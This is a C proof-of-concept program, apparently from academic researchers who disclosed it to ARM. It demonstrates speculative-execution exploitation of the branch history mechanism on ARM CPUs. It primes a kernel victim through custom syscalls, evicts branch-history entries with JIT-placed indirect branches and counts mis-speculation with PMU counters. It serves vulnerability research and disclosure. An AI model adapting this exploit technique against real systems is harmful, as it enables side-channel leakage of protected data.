/*
 * PoC Codes for Branch History Speculative Update Exploitation
 * 
 * Sunday, November 3rd 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <unistd.h>
#include <time.h>
#include <argp.h>
#include "utils.h"
#include "jit_snippets.h"
#include "target.h"
#include "pmu_debug.h"

static error_t parse_opt (int key, char *arg, struct argp_state *state);
static struct argp_option options[] =
{
    {"evict-addr",    'e',    "ADDR",     0,      "Address to on which to perform eviction, hex value starting with \"0x\"."},	{ 0 }
};
static struct argp argp = { options, parse_opt, NULL, NULL };

#define DEMO_TEST_ROUNDS 128

void prep_snippets();
void print_result();

uint64_t evict_addr = 0;
void *tramp_ret;

__attribute__((aligned(4096)))
// Indirect branches that are mapped to the same BST entry of BLR_probe.
jit_bst_entry_blr_t Bx_evict[N_EVICTS_PER_PROBE];

__attribute__((aligned(4096)))
uint64_t array_timers[DEMO_TEST_ROUNDS];

// Use PMU marks to monitor speculations
#ifdef DBG_PMU_EL0
uint8_t res_marks[DEMO_TEST_ROUNDS];
#else
#endif

__attribute__((aligned(4096))) uint8_t probe_array[256*64];

uint64_t Bx_prime_cond;

void prep_snippets()
{
    uint64_t offset_align;
    uint64_t length;

    offset_align = JIT_SNIPPET_ALIGN_OFFSET(jit_bst_entry_blr);
    length = JIT_SNIPPET_LENGTH(jit_bst_entry_blr);
    for (int j=0; j<N_EVICTS_PER_PROBE; j++)
    {
        Bx_evict[j] = prep_aligned_snippets(0, evict_addr, &jit_bst_entry_blr, 0, length, BST_IDX_MSB + 1, NULL);
    }
}

__attribute__((aligned(4096)))
void evict()
{    
    (Bx_evict[0])(RET_MEM_WRITE_IBHB(0));
    (Bx_evict[1])(RET_MEM_WRITE_IBHB(0));
}

__attribute__((aligned(4096))) int main(int argc, char *argv[], char *envp[])
{
    argp_parse(&argp, argc, argv, 0, 0, 0);
    if (evict_addr == 0)
    {
        printf("Must specify an eviction address.\n");
        return -1;
    }

    get_os_params();
    syscall(CUST_SYSCALL_ENABLE_PMU_EL0);
    init_pmu();
    
    // Create an executable memory that filled by RET ops. These RET ops can be used by indirect branches in BH[n] as branch targets to populate the iBHB.
    tramp_ret = prep_ret_mem(BASE_RET_MEM, 1 << 20, 0, 0, NULL);

    // Deploy Bx_evict to given addresses.
    prep_snippets();
    NOP_PADDING(16);

    for (int i = 0; i < 128; i++)
    {
        for (int j = 0; j < 2; j++)
        {
            Bx_prime_cond = 0;
            syscall(CUST_SYSCALL_BHS_VICTIM, Bx_prime_cond);

            Bx_prime_cond = 1;
            syscall(CUST_SYSCALL_BHS_VICTIM, Bx_prime_cond);
            syscall(CUST_SYSCALL_BHS_VICTIM, Bx_prime_cond);
        }

        evict();
        
        Bx_prime_cond = 1;
        DBG_PMU_EL0_evcntrs_pre_spec(i);
        syscall(CUST_SYSCALL_BHS_VICTIM, Bx_prime_cond);
        DBG_PMU_EL0_evcntrs_post_spec(i);
    }
    print_result();
}

void print_result()
{
    int __marks_acc;
#ifdef DBG_PMU_EL0
    __marks_acc = 0;
    for (int round = 0; round < DEMO_TEST_ROUNDS; round++)
        __marks_acc += (res_marks[round]==0) ? 0 : 1;
    printf("Mis-speculation succeeded (PMU VFP_SPEC marks): %d/%d\n\n", __marks_acc, DEMO_TEST_ROUNDS);
#endif
}

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state)
{
	switch (key)
	{
        case 'e':
            evict_addr = strtoull(arg, NULL, 16)&0xffffffffULL;
            printf("Eviction address set to 0x%lx\n", evict_addr);
            break;
		case ARGP_KEY_ARG:
			break;
		case ARGP_KEY_END:
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
}